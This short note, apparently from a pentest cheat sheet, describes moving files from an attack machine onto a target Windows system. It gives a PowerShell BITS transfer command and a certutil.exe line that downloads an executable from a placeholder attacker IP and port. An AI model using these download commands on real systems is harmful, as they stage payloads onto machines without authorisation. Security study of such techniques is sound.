#PowerShell

Good way to transfer files from attack box to target Windows system is through PowerShell since it is on every Windows machine. Best way to do this can be through the BITS system
After setting up a server on the attack machine, unless pulling a file from the Internet, you can run the below command to download that file onto the target.

```PowerShell
Start-BitsTransfer -Source <source> -Destination C:\%TEMP%
```

#cmd 

Transfer a file from a web server using the built in exe certutil.exe 

```cmd
certutil.exe -urlcache -split -f "http://{ip}:{port}/backup.exe" backup.exe
```

